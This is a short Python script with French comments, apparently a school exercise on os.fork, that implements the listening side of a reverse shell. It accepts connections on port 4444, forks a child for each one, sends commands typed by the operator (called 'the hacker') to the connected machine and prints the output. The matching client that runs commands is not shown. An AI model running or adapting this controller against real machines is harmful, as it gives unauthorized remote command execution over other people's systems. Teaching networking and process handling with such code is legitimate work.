import socket
import os
import sys

# On definit l'adresse et le port
HOST = "0.0.0.0"
PORT = 4444

def gerer_client(conn, addr):
    print(f"[+] Nouvelle connexion depuis {addr}")
    
    while True:
        try:
            # On demande une commande au "hacker" (toi)
            cmd = input(f"{addr} > ")
            
            if cmd == "exit":
                conn.send(b"exit")
                break
                
            # On envoie la commande au client
            conn.send(cmd.encode("utf-8"))
            
            # On attend la reponse
            reponse = conn.recv(4096).decode("utf-8")
            
            if not reponse:
                print("[-] Le client a ferme la connexion.")
                break
                
            print(reponse)
            
        except Exception as e:
            print(f"[-] Erreur avec le client : {e}")
            break

    conn.close()
    sys.exit(0) # Tue le processus enfant proprement

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Evite l'erreur "Address already in use"
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Serveur en ecoute sur le port {PORT}...")
    except Exception as e:
        print(f"[-] Impossible de demarrer : {e}")
        sys.exit(1)

    # Boucle principale
    while True:
        conn, addr = server.accept()
        
        # --- LE FORK DEMANDE PAR LE PROF ---
        pid = os.fork()
        
        if pid == 0:
            # Processus enfant : gère le client
            server.close()
            gerer_client(conn, addr)
        else:
            # Processus parent : continue d'écouter
            conn.close()
            print(f"[*] Processus fils cree (PID: {pid})")

if __name__ == "__main__":
    main()